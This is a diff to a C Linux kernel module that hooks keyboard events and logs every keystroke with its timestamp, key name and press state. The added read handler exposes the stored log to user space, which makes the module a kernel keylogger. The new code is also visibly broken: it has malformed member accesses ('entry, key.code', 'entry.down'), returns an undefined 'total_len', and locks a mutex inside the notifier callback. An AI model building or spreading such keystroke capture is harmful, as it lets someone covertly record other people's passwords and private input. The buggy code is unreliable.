@@ -17,10 +17,44 @@
 extern const struct s_key keys_table[];
 
 LIST_HEAD(keystroke_list);
+DEFINE_MUTEX(log_mutex);
 
 static ssize_t	my_read(struct file *file, char __user *out, size_t len, loff_t *off)
 {
-	return 0;
+	struct s_keystroke	*entry;
+	char			*tmp_buf;
+	size_t			total_size = 0;
+	size_t			current_pos = 0;
+	ssize_t			ret = 0;
+
+	tmp_buf = kmalloc(1024 * 64, GFP_KERNEL);
+	if (!tmp_buf)
+		return -ENOMEM;
+	mutex_lock(&log_mutex);
+	list_for_each_entry(entry, &keystroke_list, list) {
+		int	n = snprintf(tmp_buf + total_size, 1024 * 64 - total_size,
+				     "%02d:%02d:%02d %s (%d) %s\n",
+				     entry->tm.tm_hour, entry->tm.tm_min, entry->tm.tm_sec,
+				     entry->key.name, entry, key.code,
+				     entry.down ? "Pressed" : "Released");
+		total_size += n;
+	}
+	mutex_unlock(&log_mutex);
+	if (*off >= total_size) {
+		ret = 0;
+		goto out;
+	}
+	if (len > total_size - *off)
+		len = total_size - *off;
+	if (copy_to_user(out, tmp_buf + *off, len)) {
+		ret = -EFAULT;
+		goto out;
+	}
+	*off += len;
+	ret = len;
+out:
+	kfree(tmp_buf);
+	return total_len;
 }
 
 static const struct file_operations fops = {
@@ -47,8 +81,9 @@ static int	keyboard_event(struct notifier_block *nb, unsigned long action, void 
 	ktime_get_real_ts64(&ts);
 	time64_to_tm(ts.tv_sec, 0, &(stroke->tm));
 	stroke->down = param->down;
+	mutex_lock(&log_mutex);
 	list_add_tail(&stroke->list, &keystroke_list);
-	//kfree(stroke); ///// to remove later for fuck's sake
+	mutex_unlock(&log_mutex);
 	return NOTIFY_OK;
 }
 
